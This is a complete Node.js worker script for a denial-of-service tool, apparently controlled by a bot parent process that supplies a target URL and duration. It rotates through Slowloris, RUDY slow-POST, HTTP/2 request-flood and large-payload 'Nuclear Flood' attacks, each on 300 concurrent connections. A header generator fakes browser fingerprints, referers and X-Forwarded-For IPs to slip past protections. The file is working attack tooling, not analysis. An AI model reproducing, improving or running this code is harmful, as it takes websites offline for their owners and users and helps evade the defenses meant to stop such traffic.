const http = require('http');
const https = require('https');
const { URL } = require('url');
const got = require('got');

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.52",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/7.81.0",
];

const referers = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/",
    "https://www.instagram.com/", "https://www.baidu.com/", "https://www.wikipedia.org/", "https://yandex.ru/",
    "https://yahoo.com/", "https://www.amazon.com/", "https://www.reddit.com/", "https://duckduckgo.com/", "https://www.bing.com/", "https://www.tiktok.com/",
    "https://www.linkedin.com/", "https://www.pinterest.com/", "https://www.tumblr.com/",
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*",
    "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
];

function getRandomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function generateRandomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) { result += chars.charAt(Math.floor(Math.random() * chars.length)); }
    return result;
}

class BypassGenerator {
    constructor() {
        this.browserProfiles = [
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"macOS"'
            },
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57",
                ch: '"Microsoft Edge";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
                ch: null, // Firefox doesn't send sec-ch-ua
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                ch: '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                platform: '"Linux"'
            },
            {
                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
                ch: null, // Safari doesn't send sec-ch-ua
                platform: '"macOS"'
            }
        ];
        this.acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8'];
    }

    generateHeaders() {
        const profile = getRandomElement(this.browserProfiles);
        const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        const referer = getRandomElement(referers);

        const headers = {
            'accept': getRandomElement(acceptHeaders),
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': getRandomElement(this.acceptLanguages),
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'dnt': '1', // Do Not Track
            'sec-gpc': '1', // Global Privacy Control
            'referer': referer,
            'origin': new URL(referer).origin,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': `?${Math.round(Math.random())}`,
            'upgrade-insecure-requests': '1',
            'user-agent': profile.ua,
            'te': 'trailers',
            'X-Forwarded-For': randomIp,
            'Via': `1.1 ${randomIp}`
        };

        if (profile.ch) {
            headers['sec-ch-ua'] = profile.ch;
            headers['sec-ch-ua-mobile'] = '?0';
            headers['sec-ch-ua-platform'] = profile.platform;
        }
        
        return headers;
    }

    generatePayload() {
        const payloadType = getRandomElement(['json', 'form']);
        if (payloadType === 'json') {
            const jsonBody = {};
            for (let i = 0; i < 7; i++) {
                jsonBody[generateRandomString(8)] = generateRandomString(12);
            }
            return { contentType: 'application/json', body: JSON.stringify(jsonBody) };
        } else {
            let formBody = '';
            for (let i = 0; i < 7; i++) {
                formBody += `${generateRandomString(8)}=${generateRandomString(12)}&`;
            }
            return { contentType: 'application/x-www-form-urlencoded', body: formBody.slice(0, -1) };
        }
    }
}

class RudyAttack {
    constructor(targetUrl, threadCount, stats, bypasser) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.stats = stats;
        this.sockets = [];
        try {
            this.bypasser = bypasser;
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
        } catch (e) { this.url = null; this.protocol = null; }
    }

    createConnection() {
        if (!this.url) return null;
        this.stats.total++;
        const headers = this.bypasser.generateHeaders();
        headers['Content-Type'] = 'application/x-www-form-urlencoded';
        headers['Content-Length'] = 1000000 + Math.floor(Math.random() * 500000);
        headers['Connection'] = 'keep-alive';

        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: this.url.pathname,
            method: 'POST',
            headers: headers,
            agent: this.agent,
        };

        let timeoutId;
        const req = this.protocol.request(options, (res) => {
            this.stats.success++;
            res.resume(); // Optimasi: Konsumsi response untuk membebaskan socket
            if (timeoutId) clearTimeout(timeoutId);
        });
        req.on('error', (err) => {
            this.stats.failed++;
            if (timeoutId) clearTimeout(timeoutId);
        });

        let postBody = '';
        for (let i = 0; i < 5; i++) { postBody += `${generateRandomString(10)}=${generateRandomString(15)}&`; }
        req.write(postBody);

        const sendSlowByte = () => {
            try {
                if (req.destroyed) { if (timeoutId) clearTimeout(timeoutId); return; }
                req.write(generateRandomString(1));
            } catch (e) { if (timeoutId) clearTimeout(timeoutId); }
        };

        const scheduleNextByte = () => {
            const randomInterval = 6000 + Math.random() * 2000; // More aggressive keep-alive
            timeoutId = setTimeout(() => {
                sendSlowByte();
                scheduleNextByte();
            }, randomInterval);
        };
        scheduleNextByte();
        return { req, timeoutId };
    }

    start() {
        for (let i = 0; i < this.threadCount; i++) {
            const socket = this.createConnection();
            if (socket) { this.sockets.push(socket); }
        }
    }

    stop() {
        this.sockets.forEach(({ req, timeoutId }) => {
            if (timeoutId) clearTimeout(timeoutId);
            if (req && !req.destroyed) req.destroy();
        });
        this.sockets = [];
    }
}

class SlowlorisAttack {
    constructor(targetUrl, threadCount, stats, bypasser) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.stats = stats;
        this.sockets = [];
        try {
            this.bypasser = bypasser;
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
        } catch (e) { this.url = null; this.protocol = null; }
    }

    createConnection() {
        if (!this.url) return null;
        this.stats.total++;
        const headers = this.bypasser.generateHeaders();
        headers['Connection'] = 'keep-alive';

        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: this.url.pathname + '?' + generateRandomString(10),
            method: 'GET',
            headers: headers,
            agent: this.agent,
        };

        let intervalId;
        const req = this.protocol.request(options);

        req.on('error', (err) => {
            this.stats.failed++;
            if (intervalId) clearInterval(intervalId);
        });

        // We don't expect a response, but if the server is misconfigured and sends one,
        // we count it as a success for the connection attempt.
        req.on('response', (res) => {
            this.stats.success++;
            res.resume();
        });

        // Send initial partial headers
        req.write(`GET ${options.path} HTTP/1.1\r\nHost: ${options.hostname}\r\n`);
        this.stats.success++; // The initial connection is considered a success

        intervalId = setInterval(() => {
            try {
                if (req.destroyed) {
                    clearInterval(intervalId);
                    return;
                }
                // Send keep-alive headers
                req.write(`X-${generateRandomString(6)}: ${generateRandomString(8)}\r\n`);
            } catch (e) {
                this.stats.failed++;
                clearInterval(intervalId);
            }
        }, 8000 + Math.random() * 4000); // More aggressive keep-alive

        return { req, intervalId };
    }

    start() {
        for (let i = 0; i < this.threadCount; i++) {
            const socket = this.createConnection();
            if (socket) { this.sockets.push(socket); }
        }
    }

    stop() {
        this.sockets.forEach(({ req, intervalId }) => {
            if (intervalId) clearInterval(intervalId);
            if (req && !req.destroyed) req.destroy();
        });
        this.sockets = [];
    }
}

class L7Flood {
    constructor(targetUrl, threadCount, delay, stats, bypasser) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.delay = delay;
        this.stats = stats;
        this._running = false;
        this.bypasser = bypasser;
        try {
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
        } catch (e) { this.url = null; }
    }

    async sendRequest() {
        if (!this.url) return;
        this.stats.total++;
        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
        const method = getRandomElement(methods);
        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
        const headers = this.bypasser.generateHeaders();
        
        const options = {
            method: method,
            headers: headers,
            http2: true,
            timeout: { request: 3000 }, // More aggressive timeout
            retry: { limit: 0 },
            throwHttpErrors: false,
        };

        if (['POST', 'PUT'].includes(method)) {
            const payload = this.bypasser.generatePayload();
            options.body = payload.body;
            options.headers['Content-Type'] = payload.contentType;
        }

        try {
            await got(this.url.origin + path, options);
            this.stats.success++;
        } catch (error) {
            this.stats.failed++;
        }
    }

    async runWorker() {
        while (this.running) {
            await this.sendRequest();
            // Yield to the event loop briefly to prevent blocking,
            // but immediately schedule the next request.
            await new Promise(resolve => setImmediate(resolve));
        }
    }

    start() {
        this.running = true;
        for (let i = 0; i < this.threadCount; i++) {
            this.runWorker(); // Launch each worker, don't await
        }
    }

    stop() {
        this.running = false;
    }
}

class NuclearFlood extends L7Flood {
    async sendRequest() {
        if (!this.url) return;
        this.stats.total++;
        const method = getRandomElement(['POST', 'PUT']); // Only use heavy methods
        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
        const headers = this.bypasser.generateHeaders();

        // Generate a large random payload to stress the server
        const requestBody = generateRandomString(2048 + Math.floor(Math.random() * 14336)); // 2KB to 16KB payload
        headers['Content-Type'] = 'application/octet-stream';

        const options = {
            method: method,
            headers: headers,
            body: requestBody,
            http2: true,
            timeout: { request: 3000 }, // More aggressive timeout
            retry: { limit: 0 },
            throwHttpErrors: false,
        };

        try {
            await got(this.url.origin + path, options);
            this.stats.success++;
        } catch (error) {
            this.stats.failed++;
        }
    }
}

process.on('message', ({ targetUrl, duration }) => {
    const threads = 300;
    const l7Delay = 500;
    const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];

    // Shuffle attack order
    for (let i = allAttackModes.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [allAttackModes[i], allAttackModes[j]] = [allAttackModes[j], allAttackModes[i]];
    }

    const bypasser = new BypassGenerator();
    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };

    // Kirim statistik ke proses induk setiap detik
    setInterval(() => {
        // Hanya kirim jika ada data baru untuk dilaporkan
        if (stats.total > 0 || stats.success > 0 || stats.failed > 0) {
            if (process.send) { // Pastikan proses induk masih ada
                process.send({ type: 'stats', data: { ...stats } });
            }
            // Reset penghitung setelah mengirim
            stats.total = 0;
            stats.success = 0;
            stats.failed = 0;
        }
    }, 1000);

    const totalDurationMs = duration * 1000;
    const phaseDurationMs = totalDurationMs / allAttackModes.length;
    let currentAttacker = null;

    const executeAttackPhase = (phaseIndex) => {
        if (currentAttacker) {
            currentAttacker.stop();
        }

        if (phaseIndex >= allAttackModes.length) {
            // Proses induk (bot) akan mematikan worker ini, tidak perlu keluar secara eksplisit.
            return;
        }

        const attackMode = allAttackModes[phaseIndex];
        stats.phase = `${attackMode} Attack`;

        switch (attackMode) {
            case 'RUDY': currentAttacker = new RudyAttack(targetUrl, threads, stats, bypasser); break;
            case 'L7 Flood': currentAttacker = new L7Flood(targetUrl, threads, l7Delay, stats, bypasser); break;
            case 'Slowloris': currentAttacker = new SlowlorisAttack(targetUrl, threads, stats, bypasser); break;
            case 'Nuclear Flood': currentAttacker = new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser); break;
        }

        if (currentAttacker) {
            currentAttacker.start();
            setTimeout(() => executeAttackPhase(phaseIndex + 1), phaseDurationMs);
        }
    };

    executeAttackPhase(0);
});
